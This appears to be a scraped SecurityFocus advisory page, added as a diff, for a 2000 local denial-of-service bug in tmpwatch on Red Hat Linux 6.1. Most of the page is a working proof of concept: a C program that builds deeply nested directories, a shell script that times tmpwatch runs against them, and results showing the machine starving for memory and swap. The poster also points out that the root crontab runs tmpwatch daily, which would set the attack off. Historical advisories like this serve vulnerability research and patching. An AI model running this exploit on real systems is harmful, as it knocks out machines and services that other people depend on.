@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid1664<p><b><span style="font-size: 18pt;">Tmpwatch Recursive Write DoS Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1664/info">info</a><br><a href="http://www.securityfocus.com/bid/1664/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1664/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1664/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1664/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1664
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Failure to Handle Exceptional Conditions
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 09 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 09 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was originally posted to bugtraq by zenith parsec &lt;zenith_parsec@the-astronaut.com&gt; on September 9, 2000.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Redhat Linux 6.1  i386<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<br/><br/>---START---cut---:a.c (mode 644)<br/>// <br/>// make lots of directories.<br/>// ./a &lt;#of-dirs&gt;<br/>// ./a with no arguments to delete dirs.<br/>main(int argc,char *argv)<br/>{<br/> int c=0,d=0;<br/> if (argc!=2) <br/> {<br/>  while(!chdir("./A"))c++;<br/>  chdir("..");<br/>  printf("c=%d  removing\n",c);<br/>  while(!rmdir("./A")) {chdir("..");c--;}<br/>  if(c)printf("erm. bad thing.\n");<br/> }<br/> else<br/> {<br/>  c=atoi(argv1);<br/>  printf("c=%d  making.\n",c);<br/>  while(c--)<br/>  {<br/>   mkdir("./A",0777);<br/>   chdir("./A");<br/>  } <br/> }<br/>}<br/>--END---cut-----:a.c<br/><br/># ./testscript<br/><br/>(code follows)<br/><br/>---START---cut---:testscript (mode 755)<br/>#!/bin/sh<br/># clear the previous stuff.<br/>./a <br/>rm ./timer.results<br/>touch timer.results<br/># create a 1 deep<br/>./a 1 &gt;&gt;timer.results<br/>time tmpwatch 240 . 2&gt;&gt;timer.results<br/># create a 100 deep<br/>./a 100 &gt;&gt;timer.results<br/>time tmpwatch 240 . 2&gt;&gt;timer.results<br/># create a 200 deep<br/>./a 200 &gt;&gt;timer.results<br/>time tmpwatch 240 . 2&gt;&gt;timer.results<br/># create a 300 deep<br/>./a 300 &gt;&gt;timer.results<br/>time tmpwatch 240 . 2&gt;&gt;timer.results<br/># create a 400 deep<br/>./a 400 &gt;&gt;timer.results<br/>time tmpwatch 240 . 2&gt;&gt;timer.results<br/># create a 500 deep<br/>./a 500 &gt;&gt;timer.results<br/>time tmpwatch 240 . 2&gt;&gt;timer.results<br/># create a 600 deep<br/>./a 600 &gt;&gt;timer.results<br/>time tmpwatch 240 . 2&gt;&gt;timer.results<br/>#tidy up.<br/>./a &gt;&gt;timer.results<br/><br/>--END---cut-----:testscript<br/><br/>If you don't want to test it manually, here you will find the results on<br/>the tests on my machine. Who says u need an Athlon with cable or DSL.  I<br/>say "Well, it would be nice. Real nice." I also think this program would<br/>probably die faster and more spectacularly on a fast machine with a huge<br/>amount of memory and swap space. Oh yeah. Save anything important. And you<br/>have to run it as root. (I think. Should probably thought of that. I'll<br/>remember it for next time.) The crontab is an effective way of getting it<br/>run as root. Which it wants to do anyway. At about 4am everyday.<br/><br/>--START---cut---:timer.results (mode 644)<br/>c=1  making.<br/>0.00user 0.01system 0:00.00elapsed 125%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (96major+58minor)pagefaults 0swaps<br/>c=100  making.<br/>0.01user 0.19system 0:00.19elapsed 100%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (96major+1797minor)pagefaults 0swaps<br/>c=200  making.<br/>0.07user 0.40system 0:00.49elapsed 94%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (96major+3554minor)pagefaults 0swaps<br/>c=300  making.<br/>0.10user 0.66system 0:00.76elapsed 99%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (96major+5308minor)pagefaults 0swaps<br/>c=400  making.<br/>0.13user 1.33system 0:11.80elapsed 12%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (11766major+9445minor)pagefaults 1263swaps<br/>c=500  making.<br/>0.15user 2.11system 0:22.38elapsed 10%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (14104major+13238minor)pagefaults 2699swaps<br/>c=600  making.<br/>0.21user 2.81system 0:32.61elapsed 9%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (26066major+17781minor)pagefaults 4109swaps<br/>c=600  removing<br/>c=600  making.<br/>0.11user 2.88system 0:36.14elapsed 8%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (25741major+17567minor)pagefaults 4009swaps<br/>c=700  making.<br/>0.20user 4.24system 0:45.95elapsed 9%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (35562major+22180minor)pagefaults 5542swaps<br/>c=800  making.<br/>Command terminated by signal 2<br/>0.00user 0.00system 6:01.87elapsed 0%CPU (0avgtext+0avgdata 0maxresident)k<br/>0inputs+0outputs (102major+18minor)pagefaults 10swaps<br/>--END---cut-----:timer.results<br/><br/>(System is Cyrix-6x86 @ 187 MHz, 32M physical ram, 64M swap.)<br/><br/>(^C was pressed after about a minute into the 800 deep one. Several system<br/>programs died due to memory starvation. It took a quite a while afterwards<br/>before the console regained any usabilty. When i tried to run startx, it<br/>refused to start. xfs had died. everything looked odd. slow motion. i<br/>think it was because of the loadavg)<br/><br/># uptime<br/>  9:00pm  up  2:14,  2 users,  load average: 202.28, 363.68, 186.46
+	
+		<ul>
+</ul>
+</div>
